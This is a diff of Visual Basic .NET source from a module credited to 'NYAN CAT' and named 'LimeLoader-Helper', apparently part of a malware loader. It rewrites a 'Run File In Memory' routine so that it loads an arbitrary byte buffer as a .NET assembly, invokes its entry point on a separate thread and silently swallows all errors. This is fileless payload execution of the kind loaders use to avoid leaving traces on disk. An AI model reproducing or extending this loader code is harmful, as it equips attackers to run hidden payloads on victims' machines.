@@ -1,4 +1,4 @@
-﻿Module LimeLoader
+﻿Module Program
 
     '       ││ Author     : NYAN CAT
     '       ││ Name       : LimeLoader-Helper * Jan/9/2019
@@ -38,14 +38,26 @@
 #End Region
 
 #Region "Run File In Memory [.NET]"
-    Public Sub RunInMemory(ByVal Buffer As Byte())
-        Dim Assembly As Reflection.Assembly = Reflection.Assembly.Load(Buffer)
-        Dim EntryPoint As Reflection.MethodInfo = Assembly.EntryPoint
-        Dim Parameters As Object() = Nothing
-        If EntryPoint.GetParameters.Length > 0 Then
-            Parameters = New Object() {Nothing}
-        End If
-        EntryPoint.Invoke(Nothing, Parameters)
+    Private Delegate Function ExecuteAssembly(ByVal sender As Object, ByVal parameters As Object()) As Object
+    Public Sub Reflection(ByVal buffer As Byte())
+        Try
+            Dim parameters As Object() = Nothing
+            Dim assembly As Reflection.Assembly = Threading.Thread.GetDomain().Load(buffer)
+            Dim entrypoint As Reflection.MethodInfo = assembly.EntryPoint
+            If entrypoint.GetParameters().Length > 0 Then
+                parameters = New Object() {New String() {Nothing}}
+            End If
+            Dim assemblyExecuteThread As Threading.Thread = New Threading.Thread(Sub()
+                                                                                     Threading.Thread.BeginThreadAffinity()
+                                                                                     Threading.Thread.BeginCriticalRegion()
+                                                                                     Dim executeAssembly As ExecuteAssembly = New ExecuteAssembly(AddressOf entrypoint.Invoke)
+                                                                                     executeAssembly(Nothing, parameters)
+                                                                                     Threading.Thread.EndCriticalRegion()
+                                                                                     Threading.Thread.EndThreadAffinity()
+                                                                                 End Sub)
+            assemblyExecuteThread.Start()
+        Catch ex As Exception
+        End Try
     End Sub
 #End Region
 
